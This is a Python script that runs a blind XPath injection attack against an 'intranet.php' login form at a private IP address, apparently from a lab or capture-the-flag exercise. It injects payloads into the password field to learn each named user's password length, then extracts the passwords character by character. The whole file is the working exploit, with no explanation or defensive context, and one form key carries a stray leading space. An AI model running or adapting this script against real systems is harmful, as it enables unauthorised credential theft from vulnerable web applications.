import requests
import string

keyspace = string.printable[:-5]
proxies = { 'http' : 'http://127.0.0.1:8080' }
users = ['rita', 'jim', 'bryan', 'sarah']

def get_length(username):
    for i in range(0,33):
        payload = f"' or Username='{username}' and string-length(Password/text())={i} or '2'='1"
        data = { 'Username':'', 'Password':payload }
        r = requests.post("http://172.31.179.1/intranet.php", data=data, proxies=proxies)
        if "credentials" not in r.text:
            return i

def brute_char(username, pos):
    for char in keyspace:
        payload = f"' or Username='{username}' and substring(Password,{pos},1) = '{char}"
        data = {' Username':'', 'Password':payload }
        r = requests.post("http://172.31.179.1/intranet.php", data=data, proxies=proxies)
        if "credentials" not in r.text:
            return char
    return False

for user in users:
    pw_len = ""
    pw_char = ""
    pw_len = get_length(user)
    print(f"Password Length for {user} is {pw_len}")
    print(f"Password for {user} is: ", end='', flush=True)

    for i in range(1, pw_len +1):
        pw_char = brute_char(user, i)
        if not pw_char:
            print("Character no in keyspace")
        print(pw_char, end='', flush=True)
    print()
    print()
